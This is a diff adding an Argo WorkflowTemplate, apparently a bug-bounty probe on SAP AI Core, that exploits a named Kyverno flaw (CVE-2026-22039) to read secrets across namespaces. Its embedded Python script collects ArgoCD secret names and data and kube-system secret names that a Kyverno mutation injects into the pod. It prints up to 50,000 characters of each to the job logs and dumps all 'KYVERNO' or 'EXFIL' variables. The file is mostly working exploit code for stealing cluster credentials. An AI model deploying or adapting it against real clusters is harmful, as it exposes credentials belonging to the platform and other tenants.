@@ -1,0 +1,49 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: probe-train-v10
+  labels:
+    scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
+    executables.ai.sap.com/name: "probe-train-v10"
+    executables.ai.sap.com/description: "CVE-2026-22039 Kyverno cross-namespace secret exfil via context.apiCall urlPath bypass"
+spec:
+  templates:
+  - name: probe
+    container:
+      image: python:3.11
+      command: ["/bin/sh", "-c"]
+      args:
+      - |
+        python3 - << 'EOF'
+        import os
+
+        def report(k, v):
+            print(f"[PT10] {k}: {str(v)[:50000]}", flush=True)
+
+        report("START", "probe-train-v10 - CVE-2026-22039 Kyverno namespace restriction bypass")
+
+        argocd_names = os.environ.get("KYVERNO_EXFIL_ARGOCD_NAMES", "")
+        argocd_data  = os.environ.get("KYVERNO_EXFIL_ARGOCD_DATA", "")
+        kubesys      = os.environ.get("KYVERNO_EXFIL_KUBESYS_NAMES", "")
+
+        if argocd_names or argocd_data or kubesys:
+            report("CVE_2026_22039_STATUS", "CONFIRMED -- Kyverno mutated pod with cross-namespace data")
+        else:
+            report("CVE_2026_22039_STATUS", "env vars absent -- mutation did not fire or policy not yet applied")
+
+        report("ARGOCD_SECRET_NAMES",  argocd_names  or "(empty)")
+        report("ARGOCD_SECRET_DATA",   argocd_data   or "(empty)")
+        report("KUBE_SYSTEM_NAMES",    kubesys       or "(empty)")
+
+        # Dump all env vars that look security-relevant
+        report("---", "=== ALL INJECTED KYVERNO ENV VARS ===")
+        for k in sorted(os.environ):
+            if "KYVERNO" in k or "EXFIL" in k:
+                report(f"ENV_{k}", os.environ[k][:10000])
+
+        report("DONE", "probe-train-v10 complete")
+        EOF
+  entrypoint: probe
